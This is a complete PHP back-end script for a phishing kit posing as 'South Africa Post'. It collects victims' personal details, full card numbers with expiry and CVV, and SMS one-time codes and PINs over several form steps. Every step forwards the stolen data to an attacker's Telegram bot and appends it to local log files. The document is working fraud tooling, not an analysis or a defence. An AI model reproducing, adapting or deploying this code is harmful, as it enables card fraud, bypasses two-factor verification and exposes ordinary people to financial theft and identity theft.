<?php
require_once "function.php";
require_once "telegram.php";
$id = $chatid;
$apiToken = $api;

//================
//==> Security Headers
//================
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

//================
//==> Helper Function: Sanitize Input
//================
function sanitizeInput($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

//================
//==> INDEX: Personal Information
//================
if ($_POST['step'] == 'index') {
    $first = sanitizeInput($_POST['first'] ?? '');
    $last = sanitizeInput($_POST['last'] ?? '');
    $adress = sanitizeInput($_POST['adress'] ?? '');
    $zip = sanitizeInput($_POST['zip'] ?? '');
    $email = sanitizeInput($_POST['email'] ?? '');
    $number = sanitizeInput($_POST['number'] ?? '');
    
    if (empty($first) || empty($last) || empty($adress) || empty($zip) || empty($email) || empty($number)) {
        header("Location: index.php?error=missing_data");
        exit();
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $subject = "🇿🇦 South Africa Post | Personal Info | IP: $ip\n";
        $message = "👤 Personal Information:\n";
        $message .= "First Name: <b>" . $first . "</b>\n";
        $message .= "Last Name: <b>" . $last . "</b>\n";
        $message .= "Address: <b>" . $adress . "</b>\n";
        $message .= "Zip Code: <b>" . $zip . "</b>\n";
        $message .= "Email: <b>" . $email . "</b>\n";
        $message .= "Phone Number: <b>" . $number . "</b>\n";
        $message .= "📅 Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 User Agent: " . substr($userAgent, 0, 100) . "\n";
        
        if (isset($_POST['submit']) && !empty($apiToken)) {
            $data = [
                'chat_id' => $id,
                'text' => $subject . $message,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init("https://api.telegram.org/bot" . $apiToken . "/sendMessage");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
            error_log("Telegram API Response (Index): " . $response);
        }
        
        // Log to file
        $logData = date('Y-m-d H:i:s') . " | IP: $ip | First: $first | Last: $last | Address: $adress | Zip: $zip | Email: $email | Number: $number\n";
        file_put_contents('logs/index_' . date('Y-m-d') . '.log', $logData, FILE_APPEND | LOCK_EX);
        
        header("Location: loading.php?success=1");
        exit();
    }
}

//================
//==> CC: Card Information
//================
if ($_POST['step'] == 'cc') {
    $card = sanitizeInput($_POST['card'] ?? '');
    $date = sanitizeInput($_POST['date'] ?? '');
    $code = sanitizeInput($_POST['cvv'] ?? '');
    
    if (empty($card) || empty($date) || empty($code)) {
        header("Location: cc.php?error=missing_data");
        exit();
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $subject = "🇿🇦 South Africa Post | Card Info | IP: $ip\n";
        $message = "💳 Card Details:\n";
        $message .= "Card Number: <code>" . $card . "</code>\n";
        $message .= "Expiry Date: <b>" . $date . "</b>\n";
        $message .= "CVV: <code>" . $code . "</code>\n";
        $message .= "📅 Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 User Agent: " . substr($userAgent, 0, 100) . "\n";
        
        if (isset($_POST['submit']) && !empty($apiToken)) {
            $data = [
                'chat_id' => $id,
                'text' => $subject . $message,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init("https://api.telegram.org/bot" . $apiToken . "/sendMessage");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
            error_log("Telegram API Response (CC): " . $response);
        }
        
        // Log to file
        $logData = date('Y-m-d H:i:s') . " | IP: $ip | Card: $card | Date: $date | CVV: $code\n";
        file_put_contents('logs/cc_' . date('Y-m-d') . '.log', $logData, FILE_APPEND | LOCK_EX);
        
        header("Location: loading_1.php?success=1");
        exit();
    }
}

//================
//==> SMS 1: SMS & PIN Verification
//================
if ($_POST['step'] == 'sms') {
    $sms = sanitizeInput($_POST['sim'] ?? '');
    $pin = sanitizeInput($_POST['pin'] ?? '');
    
    if (empty($sms) || empty($pin)) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $subject = "🇿🇦 South Africa Post | SMS/PIN Missing | IP: $ip\n";
        $message = "⚠️ Verification Attempt:\n";
        $message .= "SMS Code: <code>" . ($sms ?: 'EMPTY') . "</code>\n";
        $message .= "PIN Code: <code>" . ($pin ?: 'EMPTY') . "</code>\n";
        $message .= "📅 Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 User Agent: " . substr($userAgent, 0, 100) . "\n";
        
        if (isset($_POST['submit']) && !empty($apiToken)) {
            $data = [
                'chat_id' => $id,
                'text' => $subject . $message,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init("https://api.telegram.org/bot" . $apiToken . "/sendMessage");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
            error_log("Telegram API Response (SMS 1): " . $response);
        }
        
        header("Location: sms.php?error=missing_data");
        exit();
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $subject = "🇿🇦 South Africa Post | SMS/PIN 1 | IP: $ip\n";
        $message = "🔐 Verification Details:\n";
        $message .= "SMS Code: <code>" . $sms . "</code>\n";
        $message .= "PIN Code: <code>" . $pin . "</code>\n";
        $message .= "💰 Amount: R 12,99\n";
        $message .= "🏦 Merchant: South Africa Post\n";
        $message .= "📅 Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 User Agent: " . substr($userAgent, 0, 100) . "\n";
        
        if (isset($_POST['submit']) && !empty($apiToken)) {
            $data = [
                'chat_id' => $id,
                'text' => $subject . $message,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init("https://api.telegram.org/bot" . $apiToken . "/sendMessage");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
            error_log("Telegram API Response (SMS 1): " . $response);
        }
        
        // Log to file
        $logData = date('Y-m-d H:i:s') . " | IP: $ip | SMS: $sms | PIN: $pin\n";
        file_put_contents('logs/sms_' . date('Y-m-d') . '.log', $logData, FILE_APPEND | LOCK_EX);
        
        header("Location: loading_2.php?success=1");
        exit();
    }
}

//================
//==> SMS 2: SMS & PIN Verification
//================
if ($_POST['step'] == 'sms_1') {
    $sms = sanitizeInput($_POST['sim'] ?? '');
    $pin = sanitizeInput($_POST['pin'] ?? '');
    
    if (empty($sms) || empty($pin)) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $subject = "🇿🇦 South Africa Post | SMS/PIN Missing | IP: $ip\n";
        $message = "⚠️ Verification Attempt:\n";
        $message .= "SMS Code 2: <code>" . ($sms ?: 'EMPTY') . "</code>\n";
        $message .= "PIN Code: <code>" . ($pin ?: 'EMPTY') . "</code>\n";
        $message .= "📅 Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 User Agent: " . substr($userAgent, 0, 100) . "\n";
        
        if (isset($_POST['submit']) && !empty($apiToken)) {
            $data = [
                'chat_id' => $id,
                'text' => $subject . $message,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init("https://api.telegram.org/bot" . $apiToken . "/sendMessage");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
            error_log("Telegram API Response (SMS 2): " . $response);
        }
        
        header("Location: sms.php?error=missing_data");
        exit();
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $subject = "🇿🇦 South Africa Post | SMS/PIN 2 | IP: $ip\n";
        $message = "🔐 Verification Details:\n";
        $message .= "SMS Code 2: <code>" . $sms . "</code>\n";
        $message .= "PIN Code: <code>" . $pin . "</code>\n";
        $message .= "💰 Amount: R 12,99\n";
        $message .= "🏦 Merchant: South Africa Post\n";
        $message .= "📅 Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 User Agent: " . substr($userAgent, 0, 100) . "\n";
        
        if (isset($_POST['submit']) && !empty($apiToken)) {
            $data = [
                'chat_id' => $id,
                'text' => $subject . $message,
                'parse_mode' => 'HTML'
            ];
            $ch = curl_init("https://api.telegram.org/bot" . $apiToken . "/sendMessage");
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
            error_log("Telegram API Response (SMS 2): " . $response);
        }
        
        // Log to file
        $logData = date('Y-m-d H:i:s') . " | IP: $ip | SMS2: $sms | PIN: $pin\n";
        file_put_contents('logs/sms2_' . date('Y-m-d') . '.log', $logData, FILE_APPEND | LOCK_EX);
        
        header("Location: loading_3.php?success=1");
        exit();
    }
}

//================
//==> Invalid Step
//================
header("Location: index.php?error=invalid_step");
exit();
?>